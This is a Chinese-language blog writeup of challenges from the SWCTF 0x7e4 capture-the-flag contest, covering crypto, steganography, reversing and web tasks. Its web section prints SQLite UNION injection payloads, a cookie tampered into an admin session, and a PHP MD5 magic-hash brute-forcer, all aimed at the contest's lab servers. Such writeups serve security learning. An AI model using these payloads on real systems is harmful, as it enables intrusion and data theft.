# [Writeup] SWCTF 0x7e4


2021 首篇!! 新年快樂~

這場 SWCTF 由 **逢甲大學黑客社**、**靜宜大學行雲者研發基地** 及 **台中科技大學資訊研究社** 聯合設計的 CTF 競賽。

<!--more-->

雖然還在忙碩論，但想到之後還要打 AIS3-EOF 所以還是加減摸一下，簡單記錄曾經卡住、或是第一次遇到的有趣題目(?)，雖然說 Crypto 真的都偏通靈，實在有點頭痛QQ

感謝 @stavhaygn 和 @MuMu 賽後替我解惑一下沒解開的題目wwwww  
官方解 https://hackmd.io/@swctf/writeups

<br>

附上人權圖，差不多是 Rank 1 一半的分數，我好爛QQ  
有些通靈題和 Flag 大小寫害我正確率爛掉wwwww  
![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/score.png?raw=true)


## NOKIA 3310 (靜宜-Crypto, Score: 200)
你知道如何使用手機傳簡訊嗎?
```text {linenos=false}
626352432143742174713223432153619381428142218193638252626391
```

---

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/DlJ9ehT.png?raw=true)

將數字兩兩一組，分別是 按鍵 & 按幾次。
> SWCTF{NOKIAISASPECIALMYTHTHATYOUKNOW}

（結果被大小寫雷了一次 WA ==）


## A letter (靜宜-crypto, Score: 200)
嘿!你還記得我們第一次見面你告訴我的「不可破譯的密碼」嗎？這次我把關鍵內容放在這首詩裡，或許你能夠解讀出我想告訴你的話。

[Released file (pdf)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/A_letter.pdf)

---

打開 PDF 就看到一串密文，我人很好直接幫你打在下面 ^_^
```text {linenos=false}
Kzwrsomklpp_Evfvtukb_ju_mj_hyvqevjxq_rqe_rdfipwzu_dt_Etzqfuq
```

題目說到「不可破譯的密碼」，拿去 Google 就會得到 [Vigenère cipher](https://en.wikipedia.org/wiki/Vigenère_cipher) ，那有了密文之後... key勒？

其實整個 PDF 的線索就那幾個，像是把左上角的 CMRDB 拿去當 key 丟到 [Cryptii](https://cryptii.com/pipes/vigenere-cipher) 就會有 Flag 了XD

> SWCTF{Information_Security_is_as_extensive_and_profound_as_Chinese}


## MOS (靜宜-crypto, Score: 275)
你工作上的前輩要離職了 前輩在把工作交接給你的時候把有加密的USB和兩串摩斯密碼給你 「這裡面有我們珍藏的片子，去解開它，然後傳承下去!!」

1. 請轉成大寫
2. 第二行為key
3. %u7b為"{"
4. %u7d為"}"

```text {linenos=false}
.-.. ...- . --.. -.-- ----.-- .--- .---- .- --- -..- --- --. ----- -.- -.... -.-- .-.. -.-. .--- .--.-. --... -.-- .. -..- .-.. -----.-
--.- .-- . .-. - -.-- ..- .. --- .--. .- ... -.. ..-. --. .... .--- -.- .-.. --.. -..- -.-. ...- -... -. --
```

---

題目很好心的跟你說是 Morse code，還給一堆提示，那就找個[線上工具](https://morsedecoder.com)還原ㄅ，會得到下面兩串。

```text {linenos=false}
LVEZY#J1AOXOG0K6YLCJ@7YIXL#
QWERTYUIOPASDFGHJKLZXCVBNM
```


一開始還以為第二行的 key 是指 [Vigenère cipher](https://en.wikipedia.org/wiki/Vigenère_cipher) ，結果不是... 是對應英文字母XD
```text {linenos=false}
A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 
↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓ ↓
Q W E R T Y U I O P A S D F G H J K L Z X C V B N M
```

保留數字和特殊符號，還原後整理成 Flag 就能送出去了( Flag 居然是無意義的字串) = w =

> SWCTF{Q1KIUIO0R6FSVQ@7FHUS}

## Base-X (逢甲-Crypto, Score: 200)
聽說駭客聊天時，動不動就要把訊息編碼

```text {linenos=false}
wpZTV0NURntCYXNlNjRfdEhlX0xhTkdVNDZlX09mX2g0Q2szcnN9Cg==
```

---

不囉唆，Base64。

```bash {linenos=false}
$ echo "wpZTV0NURntCYXNlNjRfdEhlX0xhTkdVNDZlX09mX2g0Q2szcnN9Cg==" | base64 --decode
```

> SWCTF{Base64_tHe_LaNGU46e_Of_h4Ck3rs}

## 左右分不清 (逢甲-Crypto, Score: 200)
有個都市傳說：  
凌晨 3 點沿著操場跑 1600 公尺會回到起點 ~(>_<。)＼
```text {linenos=false}
RVBSE{QNS_5TooNQsr_tOO3q_KNvdQbzRd}
```

---

Caesar cipher，推薦ㄍ好用的網站 https://planetcalc.com/1434/

> SWCTF{ROT_5UppORts_uPP3r_LOweRcaSe}

## N=pq (逢甲-Crypto, Score: 200)
RSA 是世界著名的加密演算法，沒記錯的話用很大的 N 當作加密參數好像就很安全？  
算了反正應該沒人能破解我加密過的 flag : )

```text {linenos=false}
N = pq = 16857159784242147958930006036274524315067659003347665436247836447121615960042560515473548747696129683
e = 65537
encrypted_flag = 4133875657690452080396474983972067706781976275589651694439550567678165824984290994659861724649235686
```
---

隨意找個 [RSA 線上工具](https://www.cryptool.org/en/cto/highlights/rsa-step-by-step)即可，當然能自己刻個 code 工具會更好www

解出來會是
```text {linenos=false}
(Decimal)
37696146816110213689299726858207805170794163239535976391601058414329946927997

(Hex)
53574354467B695F64306E375F6B6E6F775F686F775F5253415F576F726B737D

(ASCII text)
SWCTF{i_d0n7_know_how_RSA_Works}
```

最後解出來的 Decimal 送了很多次 WA，問了學弟才知道還要先轉 Hex 才能轉 ASCII，其實沒有很了解為何需要多這一層 = w =

平常 RSA 的題目不是都直接把 Decimal 外面套 Flag 格式就行了嗎QQ

> SWCTF{i_d0n7_know_how_RSA_Works}

## Advanced SQL Injection (靜宜-Web, Score: 200)
為了跟上 TIM 哥的腳步，小明持續深入研究 SQL Injection，聽說有種手法是利用 Union 作攻擊  
http://swctf.hackersir.org:20000/

---

一開始隨意用 admin : admin 弱密碼不小心成功登入，頁面顯示
```text {linenos=false}
Hi, admin
The flag is in the database.
```
（賽後翻到前端 F12 的 source code 也有給這組帳密XD）


關於 UNION 剛好近期才練習過類似的題目 [NSYSU 駭客攻防 HW 0x02 Writeups](../../2020/nsysu-htcf-hw2/)，套路上差不多。

先用 `' ORDER BY 1 --` 確認到 5 的時候會噴 ERROR，而且資料庫是 SQLite3。  
再來就是想辦法用 `UNION SELECT` 搭配 [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) 把 Flag 從資料庫中撈出來。

對了，可以注意到登進去的頁面只會顯示第二欄的訊息，也就是下手目標。
```text {linenos=false}
// 找版本: 3.27.2
' UNION SELECT NULL,sqlite_version(),NULL,NULL FROM sqlite_master -- 
// 找table名稱: flag
' UNION SELECT NULL,tbl_name,NULL,NULL FROM sqlite_master -- 
// 通靈一下從 表格flag 撈 flag ... Bingo!!
' UNION SELECT NULL,flag,NULL,NULL FROM flag -- 
```

中間省略了很多過程，基本上都是在嘗試各種戳法www

> SWCTF{c0ngratu1ati0n5_u_find_th3_f1ag}


## 🐘 (靜宜-Web, Score: 200)
PHP is the best language in the world  
http://swctf.hackersir.org:20003/

---

題目很單純，就是考 PHP 弱型別繞過。
```php {linenos=false}
substr(md5("CMRDB" . "Your Answer"), 0, 6) == md5("s1885207154a")
```

結果我被那個 CMRDB 嚇到，想說難道只能硬爆!?  
這時 @stavhaygn 剛好路過表示應該有工具吧（結果沒找到），直接把code生出來 ==

```python
import hashlib
import random
import string
import re

while True:
    answer = "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
    md5 = hashlib.md5()
    md5.update(f"CMRDB{answer}".encode())
    value = md5.hexdigest()
    match = re.match(r"0e\d{4}", value)
    if match:
        print(answer, value)
```

硬爆不難，反倒是有很多答案可以戳（k=4 的情況下就跑一堆）
```
C1Q5 0e51348aeac13f5a8bb7ba82d82a7395
XFPP 0e42173960df205b0920e0143b01a837
A3VM 0e52395734dd8c5b5107d8439c0e1eb5
1IPQ 0e3719bd0d1dc55c56e72837a84aaaf1
AFVA 0e2255ad3cbfc0cef725bb013f13ecce
...
...
```

k=2 的情況下只有一組解（3D），直接輸入就能拿 Flag 了。

> SWCTF{n0w_u_kn0w_wh@t_15_md5}

## Git (靜宜-Web, Score: 200)
小明為了學習網頁安全，正在學習如何撰寫網頁，並且使用工程師必備工具 git 做版本控管。  
http://swctf.hackersir.org:20001/

---

題目蠻明顯就是 git 了，只是一開始戳 `/.git/` 居然是 404（？）  
腦洞一下戳 `/git/` 就噴 403 Forbidden，直接拿工具 [GitHacker](https://github.com/WangYihang/GitHacker) 把檔案 Leak 出來。

{{< admonition type=note >}}
P.S. 賽中官方有修正這個問題，猜測是原本放在 Github 不能同時存在兩個 .git，所以 pull 下來忘了改檔案XD
{{< /admonition >}}

```bash {linenos=false}
$ git log --oneline
8266d82 (HEAD -> master) add my first website page and delete flag.txt
aa54633 add flag.txt
```

可以發現上一版有新增過 Flag，直接還原即可。
```bash {linenos=false}
$ git reset --hard HEAD~1
```

> SWCTF{g1t_13ak_15_easy}


## матрёшка_1 (中科-Misc, Score: 200)
There are too many fake files and fake folders, I think the scripting languages can help me solve it.

[Released file (zip)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/matpewka_1.zip)

---

載下來的檔案有近 20 MB，偷偷用 `zipinfo` 可以看到一大堆 Flag 目錄，估計是希望我們從中大海撈針。

{{< admonition type=tip >}}
P.S. 來路不明的壓縮檔案可能會有 [Zip bomb](https://en.wikipedia.org/wiki/Zip_bomb)
{{< /admonition >}}

再來直接下指令就可以拿 Flag 了。
```bash {linenos=false}
grep -rn '.' -e 'CTF'
```

不過個人平常找資料都是 `-rnw`，導致這題莫名卡住。  
最後是用 VSCode 大法，內建搜尋XDDDD

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/vscode_search.png?raw=true)

> SWCTF{SH4D0W_CL0N3_JUT5U!!!}

## матрёшка_2 (中科-Misc, Score: 200)
Do you know how to unzip this quickly?

[Released file (zip)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/matpewka_2.zip)

---

遞迴解壓縮的裸題，不過說實在自己還是不太會摳 shell script，原本想找時間練一直錯過。  
這次是從學弟那邊學 PowerShell 的寫法，如果指令不縮寫給人很專業的感覺(X)

寒假看能不能找時間練這一類的解壓縮題目，不行每次都靠隊友啊QQ

```ps1 {linenos=false}
while($?){
    Expand-Archive *.zip -DestinationPath ./Zip
    Remove-Item *.zip
    Move-Item Zip/* ./
}
```

解到最後會是張含有 base64 的圖片，還要手動還原 ==

> SWCTF{ZIP_FILE_1S_SUCK!!}

## code (中科-Crypto, Score: 200)
1 and 0 can represent everything

```text {linenos=false}
1111111011101011001111111
1000001001100111001000001
1011101000001101001011101
1011101000111001101011101
1011101010110000001011101
1000001000100101101000001
1111111010101010101111111
0000000010001001000000000
1001111111101110111010001
1111110100001011111011010
1100101011000100010101000
1100100000010000101111110
0001111000101001111100111
1100110011001100110011001
1011101101100111011101100
0011000100110011001000011
1101101001100110111110110
0000000010011000100011101
1111111011001100101011001
1000001010111011100011100
1011101011001100111111001
1011101010100100100010000
1011101000110001000111010
1000001001010001100001111
1111111011010101110001001
```

---

原本還沒什麼頭緒，拿遠一點發現是 QR code XD

我用 Python 畫圖，學弟用 MS Word 方塊取代法還原，事後轉念一想，幹這早該有工具了吧 ... 嗯也不意外啦 [binary-to-qrcode](https://bahamas10.github.io/binary-to-qrcode/)

笑死。

> SWCTF{QRRQRRQQQQRRRQRRQR}


## PNG (靜宜-Misc, Score: 200)
你所在的部隊規定傳達訊息時，必須隱藏在圖片中 而傳送圖片的過程中因不明原因損毀 請嘗試修復並找出訊息

[Released file (Unknown)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/TryToFixIt)

---

載下來的檔案用指令 `file` 看到是純 data，不過題目也提示是 .png 了。  
用 hex editor 根據 [PNG wikipedia](https://en.wikipedia.org/wiki/Portable_Network_Graphics) 恢復 Header 的檔案結構吧，修改同時也可以搭配 `pngcheck` 檢查。

修完會發現圖片可以成功點開 ... 但還沒結束 XD

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/TryToFixIt_recover.png?raw=true)

拿去丟圖片題萬用網站 https://aperisolve.fr/ （或是跑指令 `zsteg`），可以發現是 Flag 是用 [LSB](https://en.wikipedia.org/wiki/Bit_numbering#Least_significant_bit) 藏起來。

> SWCTF{QTQi3NcgqFcB5RJNvyqe}

## Loseless Flowers (逢甲-Misc, Score: 367)
冬天在家賞花其實也不錯，而且照片拍得這麼漂亮

[Released file (png)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/Loseless_Flowers.png)

---

直接拿去丟圖片題萬用網站 https://aperisolve.fr/ （或是跑指令 `exiftool`），在 ExifTool 的解析部分可以找到 IFD0 有段網址 https://pastebin.com/AQ4WqdsQ ，以及 XMP-MICROSOFT 藏有對應的密碼 x8U5@3HIZtMlmV@Upteu，結束。

> SWCTF{MY_CaMeRa_1s_Bet7er_tH4n_yOur5}

## CoolMD (逢甲-Web, Score: 200)
作筆記再也不用煩惱太單調了

https://hackmd.io/@swctf/CoolMD/

---

第一次遇到用 HackMD 出題，直接 F12 摸一下就有 Flag 了。

> SWCTF{coOL_CSsY_Cha7_r0om}


## Evil Robots (逢甲-Web, Score: 200)
機器人什麼都拿，要是連 flag 都被拿走那怎麼辦？

http://swctf.hackersir.org:20200/

---

簡單 Web，直接從 robots.txt 找到目錄 /nguinwiuniueniuw/hawuohudsoihfifiofs.php，結束。

> SWCTF{d0nt_iNDex_7HE_Fl46}


## Stupid Session (逢甲-Web, Score: 200)
好想當管理員，但只有測試帳號能用 ...

http://swctf.hackersir.org:20203/

測試帳密：test : test

---

用題目給的帳號登入後，可以看到「您收到了來自FBI的一封私訊，請登入管理員 (admin) 帳號查看！」。
所以我們直接從 cookie 下手，這裡推薦 Chrome 套件 [EditThisCookie](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg)，從網站 cookie 可以看到在 login_info 用 URL decode 後是一串 [序列化(serialization)](https://en.wikipedia.org/wiki/Serialization) 結構，如下。

```text {linenos=false}
a:1:{s:8:"username";s:4:"test";}
```

那我們就把 test 改成 admin ㄅ！

```text {linenos=false}
a:1:{s:8:"username";s:5:"admin";}
```

記得 URL encode 再拿去改 cookie，按下綠色勾勾後 F5 重新整理，拿 Flag 。

> SWCTF{C00K1eS_aR3_very_u53FuL}

## Notifications (逢甲-Web, Score: 200)
出題者喜歡吃什麼? 猜對了就給 flag

https://swctf.hackersir.org:20202/

本題請允許網站顯示通知，以獲得完整體驗

---

一開始就沒打算猜www 果不其然兩個選項都拿不到 Flag ㄏ

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/notifications.png?raw=true)

> SWCTF{SeRVICE_woRker_n3w_SubsCRiber}

## Popping Meow (逢甲-Reverse, Score: 200)
喔不，Pop Cat 想找你/妳聊天，結果一不小心擋住 flag 了 :/

[Released file (apk)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/popping_meow.apk)

---

原本想說難得遇到 apk 逆向題，無聊`strings`一下 ... 欸？

```bash {linenos=false}
$ strings popping_meow.apk | grep "CTF"
```

> SWCTF{Ju1cY_Apk_resouRcES}

## Python2Exe (逢甲-Reverse, Score: 239)
曹操心機很重，想取得旗幟必須喊出友軍口號！

[Released file (exe)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/Python2Exe.exe)

---

工具題，用 [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) 再從提取出來的檔案直接 grep Flag。

> SWCTF{PyThon_Scr1PT_kiddiES}


## password (中科-Reverse, Score: 200)
Find the password if you can!

[Released file (exe)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/password.exe)

---

exe 跑起來會要求輸入密碼，直接用 IDA 拆就會看到 password 了。

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/password.png?raw=true)

BTW，IDA 拆看到輸出的部分是 `SWCTF{ %c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c }`，實在沒看懂怎麼撈 Flag 字串出來的==

> SWCTF{W33K_P455W0RD_XD}

## func (中科-Reverse, Score: 275)
Jump or not jump?

[Released file (exe)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/func.exe)

---

用 IDA 拆一拆發現加密規則。

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/func.png?raw=true)

簡單摳一下還原，結束w

```python {linenos=false}
arr = [0, 3, 17, 29, 8, 60, 114, 60, 116, 13, 125, 17, 32, 52, 120, 122, 41, 11, 34, 58, 59, 33, 49]
key = "STRINGCHARINTFLOATDOUBLE"
flag = "".join([ chr((arr[i]) ^ ord(key[i])) for i in range(23) ])
print(flag)
```

> SWCTF{1t5_4_tr45h_func}

## easy reverse (靜宜-Reverse, Score: 200)
[Released file (exe)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/easy_reverse.exe)

---

起手式 `strings`，結束。

```bash {linenos=false}
$ strings easy_reverse.exe | grep "CTF"
```

> SWCTF{fm42kb1.gvf}

## Let’s Dance (靜宜-Crypto, Score: 200, Unsolved)
福爾摩斯將訊息進行字母替換並使用某次案件的暗號，將其與助手共享。在此次案件中福爾摩斯的助手在一張紙上留下訊息暗號。

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/question.jpg?raw=true)

---

這題應該算是... 不會用 Google 吧==
賽後直接搜尋 "dancing man decode" 就有解了幹XD

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/dancing_men_code.png?raw=true)

另外要注意的是別用 dcode.fr 的表，那個太多細節會很痛苦==
還有，Flag 是全小寫，所以可以無視題目中的旗子（感謝 MuMu 提醒）
事實證明，再簡單的題目還是會有人寫不出來，沒錯 就是我QQ

總之，奇怪的知識增加了.jpg

> SWCTF{the_murderer_is_the_author}

## Prison life (靜宜-Crypto, Score: 392, Unsolved)
或許學會如何與囚犯溝通也很重要。

[Released file (txt)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/dot.txt)

---

原本看到一堆點還在猜 Morse code，然後從標題慢慢找去奇怪的方向 Orz
結果原來是 [Tap code](https://en.wikipedia.org/wiki/Tap_code)，以後在監獄也能聊天了(X)

另外也有線上工具可以直接轉 https://cryptii.com/pipes/tap-code

> SWCTF{yiyuejidingwanshanwuzu}

## 天雨粟 鬼夜哭 (靜宜-Crypto, Score: 488, Unsolved)
小邪手中握著三叔留給他的訊息，看著爺爺書櫃裡的《淮南子》、《說文解字》、《呂氏春秋》、《荀子》、《韓非子》、《大正藏》被擺放的十分整齊，回想著三叔說過的話：「這些書裡紀錄了一位你爺爺的非常尊敬的人，他和文昌帝君有所關聯。這張紙上除了我們現代的編譯還用了因那位人物所衍伸出的智慧，我相信小邪一定可以破解。」 紙條內容：

`BJ4X06T/65K3DK3QU/6VUP45J/U6FU,4U6C04`

{{< admonition type=tip >}}
提示1: flag 中的英文字母皆為大寫
{{< /admonition >}}


---

只知道用注音的方式拼出來應該是「入雷城者可平心中一切遺憾」，然後... 就沒有然後了

官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHkxeTpu6w#天雨粟-鬼夜哭

（哭啊 也太通靈... 還要用倉頡對鍵盤字母 =w= ）

## Historic Site Tour (靜宜-Crypto, Score: 499, Unsolved)
還記得曾經說過要介紹家鄉的古蹟給你，但一直沒機會，不如就用這次機會讓你自己走一遭吧！我把他們的座標給你，期待你把這些重要的古蹟找出來！（若是英文則皆為小寫）

{{< admonition type=tip >}}
提示1: flag 是小寫英文串連而成

提示2: flag 中無空白
{{< /admonition >}}

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/Historic_Site_Tour.jpg?raw=true)

---

官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHkxeTpu6w#Historic-Site-Tour

（有點通靈... 不過想法蠻有趣的XD 但官方都不怕我們座標寫歪找不到地標嗎XD）


## GIForever (逢甲-Misc, Score: 200, Unsolved)
QR-Code 裡似乎藏著什麼訊息

[Released file (gif)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/GIForever.gif?raw=true)

---

這題我傻眼XDDDD

由於 MacBook 內建的預覽程式會自動把 .gif 每一幀都列出來，賽中打開發現四張 QR 圖，第一個想到的是要去背把圖片疊在一起掃... 結果賽後才知道原來只是把 Flag 拆成四段的QR code，幹!! 背景的うまる可愛歸可愛，還真的有混淆到我QQ

非 MacBook 使用者可以用 [stegsolve](https://github.com/zardus/ctf-tools/tree/master/stegsolve) ，把圖片匯入後從選單按 Analyse > Frame Brower 就可以把每一幀拿出來掃 QR code 了。

> SWCTF{UMarU_CRYin6_f0R3vEr_QAQAQ}

## Special RAR (逢甲-Misc, Score: 200, Unsolved)
這個 RAR 其實隱藏著不為人知的秘密

[Released file (rar)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/Special_RAR.rar)

---

官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHJs9tbpRv#Special-RAR

（太針對軟體 我覺得不行== ...不過 7-Zip 可以看到其他檔案真的長知識了）

## What Does the Wolf Say (逢甲-Misc, Score: 200, Unsolved)
有玩過 Minecraft 嗎？至少我沒見過這麼酷的狼 (⊙_⊙;)

(存檔適用版本 1.16.4；不需開啟遊戲即可解題)

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/screenshot.gif?raw=true)
[Released file (zip)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/What_Does_the_Wolf_Say_1.16.4.zip)

---

用 NBT editor 線上工具打開 /playerdata/ 的 .dat 摸一下就有 Flag 惹。

官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHJs9tbpRv#What-Does-the-Wolf-Say

(細節還沒搞懂QQ)

> SWCTF{What_kinD_oF_d0g_is_This}

## 耗子尾汁 (逢甲-Misc, Score: 200, Unsolved)
Admin：我大意了啊，沒藏好 flag！

[Released file (gif)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/mabaoguo.gif)

---

這題算是大意了QQ  
拿去丟 binwalk 就有 Flag 了 =3=

```bash {linenos=false}
$ binwalk -e mabaoguo.gif
```

> SWCTF{BzIP_1n_7z_1n_GiF_bu_jiang_wu_de}


## Real Google (逢甲-Misc, Score: 488, Unsolved)
這個網域應該是真的 Google，在上面輸入帳號密碼應該沒問題。可惜似乎連不上 ...

[thisisrealgoogle.tw](http://thisisrealgoogle.tw)

---

官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHJs9tbpRv#Real-Google

（居然是 DNS 的題目，最近才摸過 dig 沒想過是要這樣解QQ）

## Base-XX (逢甲-Crypto, Score: 467, Unsolved)
這訊息看起來似曾相似，但好像又哪裡怪怪的 ...

```text {linenos=false}
ZIpR1J2NvPqtgSJxbO4xnJ1JTGotDRpxoO4ZnLoJiMqxYAIt5TE++
```

---

我拿 [CyberChef](https://gchq.github.io/CyberChef/) 戳半天還是沒想法 Zzzz


官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHJs9tbpRv#Base-XX

（雖然猜得到是用 base64 的規則改，不過居然有工具誰知道RRR）

## babyCPP (逢甲-Reverse, Score: 392, Unsolved)
同學是個 FPS 職業選手，他做了一個訓練反應速度的小遊戲，只有職業選手的眼睛才跟得上！

[Released file (exe)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/babyCPP.exe)

---

我的 Windows 虛擬機把 `libstdc++-6.dll` 和 `libwinpthread-1.dll` 補上還是跑不起來 Orz

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/babyCPP-1.png?raw=true)


打開 IDA 摸一下就會發現疑似藏 Flag 的片段，重點在底下 `while` 如何產生 Flag。

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/babyCPP-2.png?raw=true)

仔細觀察可以發現從 v3, v4 對應的 v74, v13 位址，然後依次做 XOR，可以寫個簡單的 code 還原。

```python {linenos=false}
arr = [185, 229, 202, 12, 82, 20, 19, 218, 44, 51, 70, 155, 87, 145, 40, 142, 109, 28, 59, 200, 21, 226, 203, 16, 161, 3, 85, 46, 185, 215, 65, 18, 128, 250, 122, 19, 120, 197, 121, 184, 214, 101, 184, 126, 40, 63, 189, 76, 206, 58, 250, 1, 122, 111, 187, 127, 75, 20, 64, 171, 162, 196]
prefix = arr[:31][::-1]
postfix = arr[31:]
flag = "".join([ chr(i ^ j) for i, j in zip(prefix, postfix) ])
print(flag)
```

> SWCTF{dis4ppE4R3d_maGICal_FLaG}

## C Minor (逢甲-Reverse, Score: 435, Unsolved)
如果想拿到 flag，請先購買專業版授權碼！

[Released file (exe)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/C_Minor.exe)

---

起手式先 `file` 查看檔案類型，發現是用 .NET 寫的，用 Windows 執行起來會要求輸入字串進行驗證。

```bash {linenos=false}
C_Minor.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
```


感謝 MuMu 介紹好用的 .NET 反編譯工具 [dnSpy](https://github.com/dnSpy/dnSpy)。

簡單翻一翻會看到加密相關的函式，可以知道程式會將輸入字串進行加密後進行比對，所以我說那個要比對的對象勒？

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/C_Minor-1.png?raw=true)

翻了一陣子發現是被藏在一個類似資源庫(Resource)的地方。

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/C_Minor-2.png?raw=true)

沿路點進 address 就會看到一串 Hex 了，我們可以簡單寫個扣還原。

![ ](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/C_Minor-3.png?raw=true)


（感謝 @stavhaygn 提醒可以直接右鍵以 C# array 格式複製，會比較好處理一點XD）

```cs {linenos=false}
new byte[] {
    0x20, 0x17, 0x00, 0x00, 0x00, 0x32, 0x09, 0x05, 0x2E, 0x27, 0xF8, 0xE8, 0x19, 0x14, 
    0x0F, 0x1A, 0x14, 0x0E, 0x05, 0x08, 0x03, 0xF9, 0x30, 0xFB, 0x09, 0xF8, 0x0C, 0x08
};
```


個人是用 Python 直接偷懶一波，還原的部分看圖一應該不需要解釋吧 w

```python {linenos=false}
cipher = [0x20, 0x17, 0x00, 0x00, 0x00, 0x32, 0x09, 0x05, 0x2E, 0x27, 0xF8, 0xE8, 0x19, 0x14, 0x0F, 0x1A, 0x14, 0x0E, 0x05, 0x08, 0x03, 0xF9, 0x30, 0xFB, 0x09, 0xF8, 0x0C, 0x08]

ans = "".join([ chr((i+75) & 0xff) for i in cipher ])
print(ans[::-1])
```

> SWCTF{DNSPY_eZ_d3CryPT}

## disseminate (中科-Misc, Score: 367, Unsolved)
Can you find different flag in the article?

[Released file (txt)](https://github.com/yctseng1227/yctseng-ctf/blob/main/swctf/Released%20file/article.txt)

---

官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FB1mfrsTAP#disseminate

（原來是和 picoCTF 一樣的套路，我整篇拿去 Google 難怪沒結果==）

## My first SQL Injection (靜宜-Web, Score: 308, Unsolved)
小明想成為跟 TIM 哥一樣厲害的駭客，正在自學資訊安全，研究完 SQL Injection 後想要小試身手

http://swctf.hackersir.org:20002/

---

官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHkxeTpu6w#My-first-SQL-Injection

## Google It Yourself (逢甲-Web, Score: 200, Unsolved)
如果有 Google 不到的問題，那就再多 Google 幾次

http://swctf.hackersir.org:20201/

---

雖然知道網址點下去會跳轉到 [LMGTFY](https://lmgtfy.app/)，但戳了一下 curl 和 wget 沒結果就放棄了，結果只是我不會用 curl 嗚嗚。

```bash {linenos=false}
curl -i http://swctf.hackersir.org:20201/
```

Enter 敲下去直接就噴 Flag 了。

```http {linenos=false}
HTTP/1.1 302 Found
Date: Fri, 01 Jan 2021 12:01:11 GMT
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.4.13
Flag: SWCTF{G0ogle_It_YoUr53Lf}
Location: https://lmgtfy.app/?q=pls+give+me+the+flag
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

> SWCTF{G0ogle_It_YoUr53Lf}

## Stupid Session Revenge (逢甲-Web, Score: 200, Unsolved)
管理員學聰明了，改用了先進的技術來保護他的網站

http://swctf.hackersir.org:20204/

測試帳密：test : test

---

官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FHJs9tbpRv#Stupid-Session-Revenge

（知道是 JWT 的題目，但我好像都沒解出來過QQ）

## admin (中科-Web, Score: 499, Unsolved)
Only admin can visit this page.

http://swctf.hackersir.org:20100/

---

官方解 https://hackmd.io/@swctf/writeups/%2Fs%2FB1mfrsTAP#admin

（還真沒想過在 `X-Forwarded-For` 動手腳 XD）

